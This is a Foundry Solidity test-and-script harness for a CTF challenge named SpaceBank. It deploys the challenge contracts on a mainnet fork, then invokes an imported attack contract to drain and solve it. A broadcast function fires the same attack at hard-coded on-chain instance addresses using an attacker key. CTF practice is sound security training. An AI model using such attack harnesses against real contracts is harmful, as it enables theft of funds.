// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "./SpaceBankAttack.sol";

contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    Challenge challenge;

    function setUp() public {
        vm.createSelectFork("mainnet");
        // Directly use the mainnet for reproducing challenges
        // vm.createSelectFork("http://localhost:8545");
        // Use the provided RPC during CTF competitions
        vm.startPrank(deployer, deployer);
        deal(attacker, 1 ether);

        SpaceToken token = new SpaceToken();
        SpaceBank spacebank = new SpaceBank(address(token));
        token.mint(address(spacebank), 1000);
        challenge = new Challenge(spacebank);

        vm.stopPrank();
        console2.log("setUp done!");
    }

    // forge test --contracts .\src\test\TemplateCTF\template.t.sol -vvv
    function testExploit() public {
        // Call the solver's function with the attacker identity to test
        vm.startPrank(attacker, attacker);

        solve();
        console.log("isSolved:", challenge.isSolved());

        vm.stopPrank();
    }

    function solve() public {
        SpaceBankAttack attack = new SpaceBankAttack{value: 1 wei}(challenge);
        
        attack.solve();
        vm.roll(block.number + 2);
        attack.finish();
    
    }

    // forge script .\src\test\TemplateCTF\template.t.sol:Attacker --slow --skip-simulation --broadcast
    function run() public {
        // Broadcast transactions, similar to tests, just need set the actual address of the instance.
        vm.startBroadcast(attacker_key);
        console2.log(address(0x2d4C0a9bE173BF972314942bb953e5210B5e45f0).balance);
        challenge = Challenge(0x773dB58920450822F28A6061178413E4B7c153E7);
        solve();
        console.log("isSolved:", challenge.isSolved());
        
        vm.stopBroadcast();
    }
}


